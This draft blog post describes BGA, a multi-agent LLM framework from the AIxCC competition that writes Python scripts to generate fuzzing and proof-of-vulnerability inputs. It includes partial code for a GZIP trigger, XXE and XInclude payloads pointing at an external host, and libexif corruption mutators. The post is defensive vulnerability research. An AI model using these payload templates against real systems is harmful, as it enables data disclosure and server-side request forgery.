---
title: "BGA: Self-Evolving Exploits Through Multi-Agent AI"
meta_title: ""
description: "How BGA's multi-agent AI framework creates self-evolving exploits that adapt and improve through coverage feedback - discovering 7 critical vulnerabilities through intelligent iteration"
date: 2025-08-29T10:00:00Z
image: "/images/blog/mlla/bga_preview.png"
categories: ["Atlantis-Multilang"]
author: "Dongkwan Kim"
tags: ["mlla", "llm", "exploit-generation", "multi-agent", "bga"]
draft: true
---

## Why Programs Beat Payloads

Here's the problem that changed everything: you need an exploit with exactly 1000 'A' characters followed by shellcode. Ask an LLM to generate it directly, and you might get 847 A's, maybe 1203 A's – never quite right. But ask it to write `payload = "A" * 1000 + shellcode`, and you get perfection every time.

This insight sparked our breakthrough during the AIxCC competition. Instead of hoping AI could guess the right attack data, we taught it to write programs that create that data. The result? **Seven unique vulnerabilities discovered** - exploits that evolved and adapted until they found their targets.

The Blob Generation Agent (BGA) framework works on a simple principle: exploits that can rewrite themselves based on what they learn are far more effective than static attacks. Each agent approaches this self-evolution differently – some refine single payloads through iterative feedback, others generate variations and learn from collective results, still others perform surgical modifications on existing inputs.

What emerged was a system where exploits literally evolve in real-time, getting smarter with each execution until they crack their target.

But how did we get there? It started with a fundamental rethink of how AI should approach exploit generation.

## The Script-Based Breakthrough

We kept running into the same problem: traditional vulnerability discovery forced a fundamental trade-off. Generate attacks quickly but blindly, or craft them carefully but rigidly. Fast approaches like random fuzzing rarely penetrate modern validation layers. Careful approaches like hand-crafted exploits break when software changes.

BGA explored a different path: what if exploits could adapt themselves by generating the programs that create attacks rather than the attacks directly?

```python
def create_payload() -> bytes:
    """Instead, generate programs that create payloads."""
    # Build complex structures programmatically
    zip_file = create_zip_structure()
    xml_content = inject_xxe_payload()
    manifest = generate_valid_manifest()
    
    # Perfect format compliance every time
    return package_exploit(zip_file, xml_content, manifest)

def generate(rnd: random.Random) -> bytes:
    """Create multiple variations systematically."""
    strategy = rnd.choice(['xxe', 'xinclude', 'schema_injection'])
    return create_variant(strategy, rnd)

def mutate(rnd: random.Random, seed: bytes) -> bytes:
    """Surgically modify existing inputs."""
    critical_offset = find_vulnerability_trigger(seed)
    return inject_at_offset(seed, critical_offset, rnd)
```

This shift unlocks several key capabilities: handling arbitrarily complex formats (ZIP, XML, Protocol Buffers), incorporating dynamic values (checksums, lengths, timestamps), documenting reasoning in code comments, iterating based on coverage feedback, and generating thousands of variations from a single strategy.

Once we cracked the script-based approach, the next challenge became clear: different vulnerabilities needed different strategies. No single approach would work for everything.

## The Four Specialists: Brief Overview

The BGA framework coordinates four specialist agents, each with a different strategy for creating self-evolving exploits. Rather than competing, they complement each other – covering different vulnerability landscapes through distinct adaptation mechanisms.

**🎭 Orchestrator Agent**: The strategic commander that receives vulnerability reports, filters redundant work, and dispatches contexts to specialized agents concurrently. It ensures no resource exhaustion and manages the coordination of all exploitation attempts.

**🎯 BlobGen Agent**: The precision sniper that creates Python scripts generating targeted binary payloads. It refines single payloads through up to 4 iterations based on coverage feedback, perfect for known vulnerability paths with strict format requirements.

**🎲 Generator Agent**: The probability explorer that creates generator functions producing 20+ payload variations per iteration. It turns LLM non-determinism from weakness into strength through systematic exploration, ideal for complex formats and multiple valid attack paths.

**🔧 Mutator Agent**: The surgical specialist that focuses on single function transitions when full vulnerability context would exceed LLM limits. It creates targeted mutations for specific transitions, handling deep call graphs with precision.

Now let's dive into how we actually built these agents and the engineering challenges we solved along the way.

## Building the Agents: The Development Journey

### 🎭 Orchestrator Agent: Strategic Commander

The first challenge we faced wasn't technical – it was logistical. With multiple agents generating exploits concurrently, we needed something to prevent chaos. The Orchestrator Agent emerged as our mission control, turning potential resource conflicts into coordinated strikes.

The Orchestrator receives Bug Inducing Things (BITs) from upstream analysis (BCDA) – detailed vulnerability reports with call paths, trigger conditions, and annotated code. But not every BIT deserves attention. The Orchestrator filters aggressively:
- Eliminates transitions already covered by previous fuzzing
- Removes duplicates across different call graphs
- Filters out paths without conditional branches (no mutation opportunities)
- Prioritizes high-value targets from recent code changes

Once filtered, it transforms raw BITs into specialized contexts for each agent and dispatches work concurrently using asyncio. One BIT might spawn multiple exploitation attempts across different agents, all running in parallel. The Orchestrator ensures no resource exhaustion, no redundant work, and no cascade failures.

```
┌─────────────────┐
│ Preprocess      │ (Create contexts, determine sanitizers, priority handling)
└────────┬────────┘
         │
         ├───────────────────────┬───────────────────────┐
         ▼                       ▼                       ▼
┌──────────────────┐    ┌─────────────────┐    ┌──────────────────┐
│ BlobGenAgent     │    │ GeneratorAgent  │    │ MutatorAgent     │
│ (Concurrent)     │    │ (Concurrent)    │    │ (Concurrent)     │
└──────────────────┘    └─────────────────┘    └──────────────────┘
         │                       │                       │
         └───────────────────────┼───────────────────────┘
                                 ▼
                        ┌─────────────────┐
                        │ Finalize        │ (Aggregate results, status reporting)
                        └─────────────────┘
```

The Orchestrator's workflow demonstrates true concurrent execution: preprocessing contexts, dispatching to all three agents simultaneously, and aggregating results while maintaining system stability through intelligent resource management.

### 🎯 BlobGen Agent: The Precision Sniper

Some vulnerabilities demand surgical precision – exact timestamps, specific byte sequences, perfect format compliance. BlobGen became our answer to these high-stakes scenarios, iteratively crafting Python scripts until they hit their target with sniper-like accuracy.

**The Approach:** Instead of generating payloads directly, BlobGen creates a Python `create_payload() -> bytes` function and refines it through up to 4 iterations based on execution results.

```
┌──────────────────┐    ┌─────────────────┐    ┌──────────────────┐
│ Generate/Improve │───▶│ Collect         │───▶│ Analyze          │
│ Payload Script   │    │ Coverage        │    │ Failure          │
└──────────────────┘    └─────────────────┘    └─────────┬────────┘
         ▲                       │                       │
         │                       ▼                       │
         │               ┌─────────────────┐             │
         │               │ Finalize        │◀────────────│
         │               └─────────────────┘             │
         │                                               │
         └───────────────────────────────────────────────┘
           Retry Generation (up to 4 iterations)
```

The iterative refinement loop allows BlobGen to learn from execution feedback and progressively improve its payload generation script until it successfully reaches the target vulnerability.

**Example Approach: Apache Commons Compress GZIP**
```python
def create_payload() -> bytes:
    payload = bytearray() # Initial Setup: Create GZIP header structure
    payload.extend([0x1f, 0x8b]) # GZIP magic bytes (ID1, ID2)
    payload.append(8) # Compression method (CM) - must be 8 (DEFLATED)
    payload.append(0x08) # Flags (FLG) - set FNAME bit (0x08) to include filename

    mtime = 1731695077 # This is the key condition that triggers the vulnerability
    payload.extend(struct.pack('<I', mtime))  # 4 bytes little-endian

    payload.append(0) # Extra flags (XFL) - can be 0
    payload.append(0) # Operating system (OS) - can be any value

    filename = b"jazze" # The filename "jazze" will be passed to ProcessBuilder constructor
    payload.extend(filename)
    payload.append(0)  # Null terminator for filename

    # Add minimal compressed data to avoid EOF exceptions
    compressed_data = bytes([
        0x03, 0x00,  # Minimal deflate block (final, no compression)
        0x00, 0x00, 0x00, 0x00,  # CRC32 (4 bytes)
        0x00, 0x00, 0x00, 0x00   # ISIZE (4 bytes)
    ])
    payload.extend(compressed_data)

    return bytes(payload) # MUST return only bytes, not tuple/dict
```

Notice the surgical precision: exact modification time, specific filename pattern, proper GZIP structure. BlobGen discovered these requirements through iterative coverage analysis, using the line-level coverage data (file names, function names, and line numbers) to add `@VISITED` markers and track progress toward the vulnerability.

**When BlobGen Wins:** Known vulnerability path, strict format requirements, need for precise value combinations.

### 🎲 Generator Agent: The Probability Explorer

Then we discovered something counterintuitive that changed our whole approach: when you can't predict which attack will succeed, systematic variation beats precision. The Generator Agent emerged from a crucial realization – instead of fighting LLM non-determinism, we could weaponize it.

**The Approach:** Generator creates `generate(rnd: random.Random) -> bytes` functions that produce 20 variations per iteration. This probabilistic strategy turns LLM non-determinism from weakness into strength through systematic exploration.

```
┌──────────────────┐    ┌─────────────────┐    ┌──────────────────┐
│ Plan             │───▶│ Create/Improve  │───▶│ Collect          │
│ Generator        │    │ Generator       │    │ Coverage         │
└──────────────────┘    └─────────────────┘    └─────────┬────────┘
                                 ▲                       │
      ┌─────────────────────────▶│                       │
      │                          │                       ▼
      │                 ┌─────────────────┐    ┌──────────────────┐
      │                 │ Analyze         │◀───│ Update           │
      │                 │ Coverage        │    │ Interesting      │
      │                 └────────┬────────┘    │ Functions        │
      │                          │             └──────────────────┘
      │                          ▼
      │                 ┌─────────────────┐
      │                 │ Finalize        │
      │                 └─────────────────┘
      │
  Iterative Improvement Loop (20 variations per iteration)
```

The probabilistic approach generates multiple variations and learns from collective coverage patterns, dramatically increasing the likelihood of reaching target vulnerability points that single-attempt strategies often miss.

**Example Approach: Apache Tika XXE Attack Suite**
```python
def generate(rnd: random.Random) -> bytes:
    # ...
    # Phase 1: Create valid ZIP structure to reach parseRoot
    strategy = rnd.choice(['basic_xxe', 'xinclude', 'schema_ref', 'dtd_external'])
    
    # Generate root filename
    root_filename = rnd.choice(['root.xml', 'data.xml', 'content.xml', 'main.xml'])
    
    # Create Manifest.xml content
    manifest_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<manifest><Root>{root_filename}</Root></manifest>'''.encode('utf-8')
    
    # Phase 2: Generate exploit payload based on strategy
    if strategy == 'basic_xxe':
        # XXE with external entity targeting jazzer.com
        port = rnd.choice([80, 443, 8080, 8443])
        path = rnd.choice(['', '/test', '/data.xml', '/api/endpoint', '/config'])
        root_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://jazzer.com:{port}{path}">]>
<root>&xxe;</root>'''.encode('utf-8')
    
    elif strategy == 'xinclude':
        # XInclude attack targeting jazzer.com
        path = rnd.choice(['/data.xml', '/config.xml', '/api/data', '/external.xml'])
        protocol = rnd.choice(['http', 'https'])
        root_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include href="{protocol}://jazzer.com{path}"/>
</root>'''.encode('utf-8')
    
    # ... (other strategies) ...
    
    # Build ZIP file structure
    files = [
        ('Manifest.xml', manifest_content),
        (root_filename, root_content)
    ]
    
    # Add random additional files occasionally
    if rnd.random() < 0.3:
        extra_content = b'<extra>data</extra>'
        files.append(('extra.xml', extra_content))
    
    return create_zip(files, rnd)

# ... (helper functions) ...
```

**Why Generator Dominates:** 
- **Probabilistic Success**: If attempt #7 fails but #13 succeeds, you still win
- **Format Mastery**: Handles ZIP + XML + XXE simultaneously  
- **Strategic Variation**: Not random – intelligent exploration of attack space
- **Coverage Merger**: Learns from ALL 20 variations, not just successes

The probabilistic approach overcomes LLM non-determinism by embracing it rather than fighting it.

**When Generator Wins:** Complex formats, multiple valid approaches, exploration over precision.

### 🔧 Mutator Agent: The Surgical Specialist

The final breakthrough came when we hit a wall: some vulnerability paths were so complex that even the most capable LLMs couldn't hold the entire context. The Mutator Agent's solution was elegantly simple – focus on single transitions between functions rather than trying to comprehend the whole picture.

**The Strategy:** Mutator creates `mutate(rnd: random.Random, seed: bytes) -> bytes` functions that surgically target specific function-to-function transitions. This focused approach handles large codebases by concentrating on precise transition points.

```
┌─────────────────┐
│ Plan            │
│ Mutation        │
└────────┬────────┘
         │
         ▼
┌──────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│ Create/Improve   │───▶│ Analyze         │───▶│ Finalize        │
│ Mutator          │    │ Mutator         │    │                 │
└──────────────────┘    └────────┬────────┘    └─────────────────┘
         ▲                       │
         │                       │
         └───────────────────────┘
           Improvement Loop (focused on single transitions)
```

The focused analysis loop concentrates on single function transitions, making it effective when full vulnerability context would overwhelm LLM context limits while still enabling precise payload mutations.

**Example Approach: libexif Memory Corruption**
```python
def mutate(rnd: random.Random, seed: bytes) -> bytes:
    # ...
    exif_pos = seed.find(b'Exif\x00\x00')    
    tiff_start = exif_pos + 6
    # ... (boundary checks) ...
    
    makernote_pos = _find_makernote_start(seed, tiff_start)
    if makernote_pos == -1:
        makernote_pos = min(tiff_start + 64, len(seed))
    
    prefix = seed[:makernote_pos]
    body = seed[makernote_pos:]
    
    # 30% chance for generic mutations to maintain diversity
    if rnd.random() < 0.3:
        return _generic_mutate(rnd, seed)
    
    # Apply format-specific mutations to Makernote section
    mutated_body = _mutate_makernote(rnd, body)
    result = prefix + mutated_body
    
    return result[:min(len(result), 102400)]

def _mutate_makernote(rnd, body):
    strategy = rnd.randint(0, 5)
    
    if strategy == 0:
        return _mutate_signature(rnd, body)
    elif strategy == 1:
        return _mutate_endianness(rnd, body)
    elif strategy == 2:
        return _mutate_directory(rnd, body)  # Corrupt directory counts and field types
    elif strategy == 3:
        return _mutate_sizes(rnd, body)      # Create oversized data fields
    elif strategy == 4:
        return _mutate_offsets(rnd, body)    # Corrupt offset values for out-of-bounds access
    else:
        return _byte_mutations(rnd, body)

# ... (mutation strategy implementations) ...
```

**Why Mutator Succeeded:** When dealing with deep call chains where understanding the full context would overwhelm even the most capable LLM, Mutator's focused approach shines. It doesn't need to understand the entire vulnerability – just how to navigate from function A to function B.

**When Mutator Wins:** Deep call graphs, context limitations, specific transition requirements.

After months of development, we were ready to put BGA to the ultimate test: the AIxCC competition against some of the world's best security teams.

## Competition Results and Technical Analysis

### Seven Critical Discoveries

The AIxCC competition became our proving ground. When the dust settled, BGA had discovered **7 unique vulnerabilities** – genuine bugs in production software that other approaches had completely missed. Each discovery validated a different aspect of our multi-agent approach.

| Agent | Vulnerabilities Found | Approach |
|-------|---------------------|----------|
| **Generator** | 4 PoVs | Probabilistic exploration with 20+ variations |
| **BlobGen** | 2 PoVs | Iterative refinement with coverage feedback |
| **Mutator** | 1 PoV | Surgical targeting of function transitions |
| **Total** | **7 PoVs** | Multi-agent coordination |

These discoveries validate the multi-agent, script-based approach, though the specific code examples shown throughout this post come from earlier development and rounds, illustrating how the techniques work in practice.

### Why Multiple Agents Were Necessary

A critical question emerged during development: if Generator was finding the most bugs, why not just use it for everything? The answer revealed a fundamental insight about vulnerability exploitation – different bug classes require completely different evolutionary strategies.

The Orchestrator coordinates this by analyzing each vulnerability candidate and dispatching appropriate agents concurrently. Some vulnerabilities need surgical precision, others benefit from probabilistic exploration, and still others require iterative refinement. Rather than forcing one approach on all problems, the multi-agent system lets each strategy handle what it does best while running in parallel through intelligent orchestration.

### The Technical Breakthroughs Behind Our Success

Looking back, several key innovations emerged that we believe enabled these discoveries:

**The Script-Based Revolution**: Our core breakthrough was teaching LLMs to generate Python programs instead of raw payloads. This paradigm shift unlocked complex format handling, dynamic value incorporation, and self-documenting exploit logic.

**Probabilistic Exploration Strategy**: The Generator approach embraces systematic variation rather than hoping for deterministic success:

```python
# Traditional approach often fails:
perfect_payload = generate_perfect()  

# Multi-variation approach: try systematic alternatives
for i in range(20):
    variant = generate(random.Random(seed + i))
    result = execute(variant)
    coverage.merge(result)  # Learn from ALL attempts
```

**Collective Learning from Execution**: Rather than learning only from successes, the system analyzes patterns across all variations, merging coverage data from multiple payload attempts to understand which strategies are making progress toward the target vulnerability.

**Coverage-Guided Evolution**: We used line coverage information consisting of hit file name, function name, and line number to guide the LLM evolution process. While this coverage data wasn't always perfectly accurate, it provided crucial intelligence that helped our agents understand which parts of the target code were being reached and which critical paths remained unexplored. BlobGen used structured feedback showing exactly which vulnerability conditions were hit versus missed, while Generator tracked collective coverage patterns across all 20+ variations to understand which strategies were making progress toward targets.

These innovations proved especially effective against the types of vulnerabilities we encountered, which shared several challenging characteristics:

- **Format Complexity**: Multi-layer format requirements (valid ZIP containing valid XML containing valid XXE) that challenge traditional random approaches
- **Semantic Requirements**: Understanding that specific functions execute commands or that certain values trigger vulnerabilities  
- **Precision Constraints**: Exact checksums, specific string patterns, correct binary structures
- **Multiple Valid Attack Paths**: Different strategies leading to the same vulnerability

We believe traditional approaches would require millions of attempts to accidentally discover these combinations, while the self-evolving approach found them more systematically through code understanding, execution feedback, and adaptive strategy refinement.

Reflecting on this journey, several key insights emerged that go beyond just the technical implementation.

## Lessons Learned: Key Insights from Development

Developing BGA revealed several critical insights about LLM-based security research and multi-agent coordination:

### Context Management and LLM Limitations

One of our biggest revelations was that LLM context limitations aren't just about token counts – they're about meaningful reasoning boundaries. The Mutator Agent's focused transition analysis emerged from recognizing that trying to understand entire call graphs often overwhelmed the LLM's ability to provide precise analysis. By concentrating on single function transitions, we achieved surgical precision that wouldn't be possible with broader context.

### The Power of Indirection

Perhaps our most transformative insight was realizing that the best way to get what you want from an LLM isn't always to ask for it directly. By asking for executable exploit recipes rather than raw exploits, we discovered we could leverage LLM strengths (code generation and logical reasoning) while sidestepping their weaknesses (precise binary format construction).

### Multi-Agent Coordination Challenges

We quickly learned that coordinating multiple LLM agents creates entirely new classes of problems that simply don't exist in single-agent systems. Building effective multi-agent orchestration required breakthroughs in several areas:

- **Fault Isolation** is critical – one agent's failure cannot cascade to others, requiring careful async error handling
- **Resource Management** through semaphore-based concurrency control prevents system exhaustion while maintaining parallelism  
- **Context Transformation** requires tailoring information for each agent's specialized needs rather than broadcasting everything
- **Intelligent Filtering** eliminates redundant work across agents to avoid wasting computational resources
- **Work Distribution** requires understanding each agent's strengths and dispatching appropriate vulnerability contexts
- **Result Aggregation** from multiple concurrent agents while maintaining system stability and preventing race conditions

### Domain Knowledge Integration

Rather than overwhelming LLMs with comprehensive security knowledge, we found that adaptive, context-sensitive guidance works better. The system selectively integrates vulnerability patterns and data structure insights based on target-specific analysis, preventing information overload while ensuring relevant knowledge reaches the agents.

### When "Good Enough" Beats Perfect

The Generator Agent taught us a counterintuitive lesson about working with non-deterministic systems: sometimes it's better to generate 20 "good enough" attempts than to spend all your effort trying to craft one perfect solution. This insight applies far beyond exploit generation – it's a fundamental principle for working with any probabilistic AI system.

*For a deep dive into the context engineering techniques that enable these capabilities, see our upcoming post: "Context Engineering: How BGA Teaches LLMs to Write Exploits"*

So where does this breakthrough lead us? The implications extend far beyond just finding vulnerabilities.

## Future Vision: Where BGA Goes Next

BGA's success in AIxCC revealed something important: **we already have incredible context information available**, but we may not be utilizing it effectively.

### The Context Goldmine We're Sitting On

Looking at our current pipeline, we have access to rich information that most LLM systems can only dream of:

- **Testlang structure** from our harness analysis
- **Dictgen tokens** and existing dictionary patterns in the repo  
- **Concolic constraints** from our symbolic execution tools
- **Call graphs** from CPUA providing precise function relationships
- **Bug information (BITs)** from BCDA with detailed vulnerability context
- **Plus many other analysis tools** feeding structured data

The realization hit us: we may not be utilizing these context sources effectively. 

### Context Engineering: The Next Frontier

Working with LLMs taught us they function much like humans in crucial ways:

- **Love top-down descriptions** - they need the big picture first
- **Require context information and direct instructions** - vague requests fail
- **Core information is important and verbosity matters** - too much noise hurts, too little context also hurts

This points to a massive opportunity: **context engineering**. People talk about "prompt engineering," but we think the future is "context engineering" - intelligently structuring and presenting information to maximize LLM effectiveness.

### The Questions Driving Us Forward

- **Context Optimization**: How can we effectively structure all this rich information? 
- **Beyond Fuzzing**: Can we build a full exploit agent for CTF targets (like XBOW) or real-world vulnerabilities without harnesses?
- **Memory Utilization**: Can we tap into LLMs' knowledge base like humans recall memories? They already know about Java's ServletFileUpload, repository patterns, and common vulnerability classes
- **Intermediate Representations**: Is there an LLM-friendly structure for representing code, bugs, and exploitation context?
- **Context Engineering for Discovery**: Can better context engineering enhance not just exploitation but bug discovery itself?

### The Bigger Picture

BGA proved that script-based generation works. Now the question becomes: how far can intelligent context engineering take us? The components are all there - we just need to learn how to orchestrate them more effectively.

## Dive Deeper

Ready to explore BGA in detail? Here are your next steps:

### 📚 **Technical Resources**
- **Source Code by Agent:**
  - [Orchestrator Agent](https://github.com/Team-Atlanta/aixcc-afc-atlantis/tree/main/example-crs-webservice/crs-multilang/blob-gen/multilang-llm-agent/mlla/agents/orchestrator_agent)
  - [BlobGen Agent](https://github.com/Team-Atlanta/aixcc-afc-atlantis/tree/main/example-crs-webservice/crs-multilang/blob-gen/multilang-llm-agent/mlla/agents/blobgen_agent)
  - [Generator Agent](https://github.com/Team-Atlanta/aixcc-afc-atlantis/tree/main/example-crs-webservice/crs-multilang/blob-gen/multilang-llm-agent/mlla/agents/generator_agent)
  - [Mutator Agent](https://github.com/Team-Atlanta/aixcc-afc-atlantis/tree/main/example-crs-webservice/crs-multilang/blob-gen/multilang-llm-agent/mlla/agents/mutator_agent)

### 🔗 **Related Deep Dives**
- [MLLA Overview: The Complete System](https://team-atlanta.github.io/blog/post-mlla-overview/)
- [UniAFL: The Fuzzing Infrastructure](https://team-atlanta.github.io/blog/post-crs-multilang/)
- Coming Soon: "Context Engineering: How BGA Teaches LLMs to Write Exploits"
- Coming Soon: "Inside BCDA: How AI Detects Real Vulnerabilities"

---

Self-evolving exploits represent a different approach to AI-assisted security research – one where adaptation and learning drive success rather than hoping for perfect initial generation.
